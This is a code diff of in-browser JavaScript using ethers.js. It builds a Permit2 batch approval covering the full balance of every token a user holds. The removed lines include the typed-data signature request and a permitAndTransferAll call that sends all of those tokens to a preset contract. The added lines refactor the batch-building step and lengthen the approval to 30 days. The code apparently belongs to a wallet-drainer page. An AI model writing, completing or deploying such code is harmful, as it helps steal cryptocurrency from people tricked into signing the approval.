@@ -278,91 +278,49 @@ for (let token of TOKENS) {
 
  const permit2=new ethers.Contract(PERMIT2,permitAbi,provider);
 
- let details=[];
+ log("📦 Building Permit2 batch...");
 
- for(let token of TOKENS){
+let details = [];
 
-  log("Checking token: " + token);
+for (let token of TOKENS) {
 
-  const tokenC=new ethers.Contract(token,abi,provider);
-  const bal=await tokenC.balanceOf(user);
+  log(`Checking token: ${token}`);
 
-  log("Balance: " + bal.toString());
+  const tokenC = new ethers.Contract(
+    token,
+    ["function balanceOf(address) view returns (uint256)"],
+    provider
+  );
 
-  const res=await permit2.allowance(user,token,CONTRACT);
+  const balance = await tokenC.balanceOf(user);
 
-  log("Nonce: " + res[2]);
+  log(`Balance raw: ${balance}`);
+
+  if (balance == 0n) {
+    log("⏭️ Skipping (0 balance)");
+    continue;
+  }
+
+  const res = await permit2.allowance(user, token, CONTRACT);
+  const nonce = res[2];
+
+  log(`Nonce: ${nonce}`);
+
+  const expiration = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30;
 
   details.push({
-   token,
-   amount:bal,
-   expiration:Math.floor(Date.now()/1000)+3600,
-   nonce:res[2]
+    token: token,
+    amount: balance,
+    expiration: expiration,
+    nonce: nonce
   });
- }
 
- log("Building signature...");
+  log("✅ Added to batch");
+}
 
- const chainId=(await provider.getNetwork()).chainId;
-
- const domain={
-  name:"Permit2",
-  chainId:Number(chainId),
-  verifyingContract:PERMIT2
- };
-
- const types={
-  PermitBatch:[
-   {name:"details",type:"PermitDetails[]"},
-   {name:"spender",type:"address"},
-   {name:"sigDeadline",type:"uint256"}
-  ],
-  PermitDetails:[
-   {name:"token",type:"address"},
-   {name:"amount",type:"uint160"},
-   {name:"expiration",type:"uint48"},
-   {name:"nonce",type:"uint48"}
-  ]
- };
-
- const value={
-  details,
-  spender:CONTRACT,
-  sigDeadline:Math.floor(Date.now()/1000)+3600
- };
-
- log("Waiting for signature...");
- const signature=await signer.signTypedData(domain,types,value);
-
- log("Signature OK");
-
- const ABI = [
-  "function permitAndTransferAll(address user, address[] tokens, bytes permitBatch, bytes signature)"
- ];
-
- const contract = new ethers.Contract(CONTRACT, ABI, signer);
-
- log("Encoding permit data...");
-
- const encoded=ethers.AbiCoder.defaultAbiCoder().encode(
-  ["tuple(tuple(address,uint160,uint48,uint48)[],address,uint256)"],
-  [value]
- );
-
- log("Sending transaction...");
-
- const tx=await contract.permitAndTransferAll(user,TOKENS,encoded,signature);
-
- log("TX sent: " + tx.hash);
-
- await tx.wait();
-
- log("✅ DONE");
-
- }catch(e){
-  console.error(e);
-  log("❌ ERROR: " + (e.reason || e.message));
- }
+if (details.length === 0) {
+  log("❌ No tokens with balance → stopping");
+  return;
 }
 function updateStatus(dotId, textId, text, color) {
     const dot = document.getElementById(dotId);
